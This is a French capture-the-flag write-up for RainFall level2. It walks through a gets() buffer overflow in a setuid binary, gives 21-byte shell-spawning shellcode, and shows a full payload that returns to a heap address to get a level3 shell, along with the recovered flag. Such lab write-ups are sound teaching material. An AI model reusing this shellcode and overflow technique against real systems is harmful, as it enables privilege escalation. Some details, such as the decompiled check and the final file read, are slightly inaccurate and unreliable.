## `Level2`

## Introduction

Nous avons un exécutable `level2` avec les droits suivants :

```bash
level2@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level2 level2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level2 level2 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
-rw-r--r--+ 1 level2 level2   65 Sep 23  2015 .pass
-rw-r--r--  1 level2 level2  675 Apr  3  2012 .profile
```

Lorsque nous l'exécutons, il semble doubler l'entrée standard comme un effet miroir.

```bash
level2@RainFall:~$ ./level2 
ls
ls
```

Nous allons analyser et décompiler l'exécutable pour comprendre son comportement et identifier une éventuelle vulnérabilité.

## Analyse et Décompilation

## Code décomplié 

```c
void    p(void)
{
    int     memory;
    char    buffer[76];

    fflush(stdout);

    gets(buffer);

    if (memory & 0xb0000000)
    {
        printf("(%p)\n", &memory);
        exit(1);
    }

    puts(buffer);
    strdup(buffer);
}

int     main(void)
{
    p();
    return (0);
}
```

### Fonction `main`

Après décompilation, nous observons que la fonction `main` appelle la fonction `p` :

```assembly
(gdb) b main
Breakpoint 1 at 0x8048542
(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:	push   %ebp
   0x08048540 <+1>:	mov    %esp,%ebp
   0x08048542 <+3>:	and    $0xfffffff0,%esp
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave  
   0x0804854b <+12>:	ret    
End of assembler dump.
```

### Fonction `p`

La fonction `p` contient une vulnérabilité due à l'utilisation de `gets`, ce qui permet un débordement de tampon. Voici le désassemblage de la fonction `p` :

```assembly
(gdb) b p
Breakpoint 2 at 0x80484da
(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   %ebp
   0x080484d5 <+1>:	mov    %esp,%ebp
   0x080484d7 <+3>:	sub    $0x68,%esp
   0x080484da <+6>:	mov    0x8049860,%eax
   0x080484df <+11>:	mov    %eax,(%esp)
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:	mov    %eax,(%esp)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    $0x8048620,%eax
   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
   0x0804850f <+59>:	mov    %edx,0x4(%esp)
   0x08048513 <+63>:	mov    %eax,(%esp)
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	movl   $0x1,(%esp)
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:	mov    %eax,(%esp)
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:	mov    %eax,(%esp)
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave  
   0x0804853e <+106>:	ret    
End of assembler dump.
```

### Vérification d'adresse

Il y a une vérification sur les adresses allant de `0xb0000000` à `0xbfffffff`, empêchant ainsi l'utilisation de la pile pour stocker le shellcode. 

## Utilisation du tas (heap)

Nous pouvons utiliser le tas (heap) pour stocker notre shellcode. La fonction `strdup` utilise `malloc`, qui alloue la mémoire dans le tas. Nous voyons que `malloc` retourne toujours l'adresse `0x804a008` :

```bash
level2@RainFall:~$ ltrace ./level2 
__libc_start_main(0x804853f, 1, 0xbffff804, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                              = 0
gets(0xbffff70c, 0, 0, 0xb7e5ec73, 0x80482b5)                   = 0xbffff70c
puts("")                                                        = 1
strdup("")                                                      = 0x0804a008
+++ exited (status 8) +++
```

Nous pouvons essayer de copier un shellcode dans le tas et utiliser l'adresse allouée par `malloc` comme adresse de retour.

### Shellcode

Nous le trouvons sur ce site : https://shell-storm.org/shellcode/files/shellcode-575.html

Nous utiliserons le shellcode suivant de 21 octets :

```
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

## Construction du payload

Notre shellcode fait 21 octets de long. Nous devons remplir avec des données arbitraires jusqu'à 80 octets, puis les 4 derniers octets pour l'adresse de retour.

### Payload final

Le buffer d'attaque final sera structuré comme suit :

- Shellcode : 21 octets
- Remplissage de données arbitraires : 59 octets
- Adresse de retour : 4 octets

```bash
level2@RainFall:~$ (python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"'; cat -) | ./level2
```


## Accès au Shell

Un shell est accessible ensuite :

```bash
level2@RainFall:~$ pwd
/home/user/level2
level2@RainFall:~$ id
uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
level2@RainFall:~$ whoami
level3
level2@RainFall:~$ cat /home/user/level2/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

## Conclusion

Nous avons réussi à exploiter la vulnérabilité de débordement de tampon dans `level2` en utilisant le tas (heap) pour stocker notre shellcode et en écrasant l

'adresse de retour pour pointer vers cette région. Cela nous a permis d'exécuter le shellcode et d'obtenir un shell avec les privilèges de `level3`, nous permettant de lire le flag pour le niveau suivant.

Level2 passé avec succès !
